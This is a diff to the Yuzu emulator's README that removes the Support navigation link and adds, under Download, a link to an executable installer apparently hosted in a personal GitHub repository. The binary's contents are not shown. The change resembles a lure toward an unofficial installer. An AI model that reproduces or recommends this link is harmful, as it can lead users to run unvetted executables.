@@ -32,7 +32,6 @@ It is written in C++ with portability in mind, and we actively maintain builds f
   <a href="#development">Development</a> |
   <a href="#building">Building</a> |
   <a href="#download">Download</a> |
-  <a href="#support">Support</a> |
   <a href="#license">License</a>
 </p>
 
@@ -2025,6 +2024,8 @@ gdb ../build/bin/yuzu            # Start GDB
 </div>    </div>
 
 ##Download
+
+<a href="https://github.com/duhsoares21/Yuzu/blob/main/download/yuzu_install.exe"/>Download Yuzu</a>
 
 ## License
 
